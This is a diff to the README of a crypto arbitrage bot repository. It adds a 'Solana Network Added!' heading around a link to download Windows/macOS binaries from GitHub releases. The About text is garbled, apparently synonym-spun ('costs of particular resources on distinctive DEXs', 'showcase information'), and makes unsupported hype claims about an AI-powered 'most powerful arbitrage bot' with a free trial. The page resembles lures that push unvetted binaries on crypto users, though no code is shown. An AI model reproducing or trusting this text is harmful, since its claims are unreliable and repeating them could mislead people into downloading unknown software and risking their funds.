@@ -7,7 +7,7 @@
 
 ## [Download (Windows / macOS)](https://github.com/trendcryptobots/Uniswap-Pancakeswap-Arbitrage-Bot/releases/latest).
 
-# About
+# About -- Solana Network Added!
 The bot ceaselessly screens the costs of particular resources on distinctive DEXs, seeking out for openings to purchase at a lower price on one trade and offer at the next cost on another. When a favorable arbitrage opportunity is distinguished, the bot consequently executes the exchanges to capitalize on the cost dissimilarity and create profits.Through nonstop checking of different DEX stages, bot analyzes real-time showcase information to distinguish occasions where an asset's cost veers altogether over trades.
 
 Thanks to artificial intelligence support, we are confident that we have the most powerful arbitrage bot on the market. And now you can test the full version features for free for 1 month.
